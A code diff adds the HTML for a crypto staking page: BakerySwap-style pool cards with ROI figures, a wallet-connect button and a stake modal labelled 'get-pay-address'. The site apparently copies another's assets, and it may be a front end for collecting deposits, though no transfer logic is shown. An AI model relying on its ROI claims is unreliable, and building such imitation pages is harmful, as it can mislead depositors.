+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+
+                <div
+                  style="background-image: url(images/icon_eth_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_eth.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">ETH-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">ETH-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">8.70%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_busd_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_busd.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">BUSD-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BUSD-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">16.89%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_usdt_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_usdt.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">USDT-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">USDT-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">19.69%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_doggy_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_doggy.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">DOGGY-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">DOGGY-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">12.15%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_car_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_car.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">CAR-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAR-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">25.14%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_car_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_car.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">CAR TO BAKE</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAR</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">20.54%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+
+                <div
+                  style="background-image: url(images/icon_poker_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_poker.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">POKER-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">POKER-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">31.32%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_poker_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_poker.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">POKER TO BAKE</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">POKER</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">27.51%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_tokau_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_tokau.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">CAKE-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAKE-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">13.12%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_soccer_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_soccer.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">SOCCER-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">SOCCER-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">28.35%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+
+                <div
+                  style="background-image: url(images/icon_bake_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/7846.png"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">Unbound</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">UNB</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">6.34%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_btc_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/16091.png"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">MetaGods</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">MGOD</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">11.43%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_eth_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_eth.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">ETH-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">ETH-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">8.70%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_busd_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_busd.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">BUSD-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BUSD-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">16.89%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+              </div>
+              <div class="sc-fcxLGG kmuIRO"></div>
+            </div>
+          </div>
+          <div id="bodyContainerConnect" class="sc-iQLKIq eScRiI">
+            <div class="sc-jKJlTe sc-giadOv hmoZve"></div>
+            <div height="0" class="sc-jVODtj Zdrfh">
+              <div class="sc-kUaPvJ jTpnNj"></div>
+            </div>
+            <div class="sc-dxZgTM jhbSWw">
+              <div
+                class="sc-eTpRJs gMlAVx css-xv7cdu"
+                style="margin-bottom: 20px"
+              >
+                Earning
+              </div>
+            </div>
+            <div class="sc-jRhVzh cyfMhC">
+              <button
+                id="global-btn-connect"
+                class="sc-bdVaJa dkzats sc-iRbamj sc-gipzik sc-hkbPbT jjJrJv"
+              >
+                Connect to a wallet
+              </button>
+            </div>
+            <div class="sc-fcxLGG kmuIRO"></div>
+          </div>
+          <style>
+            .jjJrJv {
+              font-weight: 500;
+              text-align: center;
+              border-radius: 10px;
+              outline: none;
+              border: 1px solid transparent;
+              font-family: "Baloo Da";
+              text-decoration: none;
+              display: flex;
+              -webkit-box-pack: center;
+              justify-content: center;
+              flex-wrap: nowrap;
+              -webkit-box-align: center;
+              align-items: center;
+              cursor: pointer;
+              position: relative;
+              z-index: 1;
+              background-color: rgb(172, 86, 42);
+              color: rgb(255, 253, 250);
+              margin: 54px auto 0px;
+              width: initial;
+              padding: 8px 16px;
+            }
+          </style>
+        </div>
+      </div>
+    </div>
+    <div></div>
+    <!-- Modal -->
+    <div
+      class="modal fade"
+      id="get-pay-address"
+      tabindex="-1"
+      role="dialog"
+      data-backdrop="static"
+      aria-labelledby="exampleModalCenterTitle"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content depositModal">
+          <div class="modal-header" style="position: relative">
+            <h5
+              class="modal-title"
+              id="exampleModalLongTitle"
+              style="color: #984c25; font-weight: 600"
+            >
+              Stake Amount
+            </h5>
+            <button
+              style="
+                border: none;
+                background: transparent;
+                position: absolute;
+                top: 14px;
+                right: 39px;
+                font-size: 30px;
+                color: #da8c64;
+              "
+              type="button"
+              data-dismiss="modal"
+              class="close"
+              id="closeModal"
+              aria-label="Close"
+            >
+              <span aria-hidden="true">&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <span id="result"></span>
+            <div
+              style="
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+              "
+            >
+              <div class="stakeColor">Stake</div>
+              <div
+                class="d-flex align-items-center"
+                style="display: flex; align-items: center; color: black"
+              >
+                <div style="margin-right: 10px; margin-left: 10px">
+                  <!-- <span id="balanceBNB" class="stakeColor"></span> -->
+                  <span id="balanceBUSD"></span>
+                  <span id="balanceUSDT"></span>
+                </div>
+                <div
+                  style="
+                    display: flex;
+                    align-items: center;
+                    flex-direction: column;
+                  "
+                  class="stakeColor"
+                >
+                  <p style="margin-bottom: 2px">Min.amount:</p>
+                  <p style="margin-bottom: 2px">40</p>
+                </div>
+              </div>
+            </div>
+            <div style="position: relative">
+              <input
+                type="text"
+                onkeyup="validateAmount()"
+                onKeyDown="preventBackspace()"
+                oninput="keyUp(event)"
+                id="depositAmount"
+                placeholder="0.00"
+                class="stakeinput form-control"
+              />
+            </div>
+            <div class="d-flex justify-content-right" style="text-align: end">
+              <div class="mr-3" style="color: #984c25 !important">Balance:</div>
+              <span id="balanceBNB" style="color: #984c25 !important"></span>
+            </div>
+          </div>
+          <div
+            class="sc-hmvkKb gsyRVd modal-footer d-flex justify-content-center"
+          >
+            <button
+              type="button"
+              id="sendEthButton"
+              class="sc-dHIava idVSmq cnf"
+            >
+              Confirm
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div
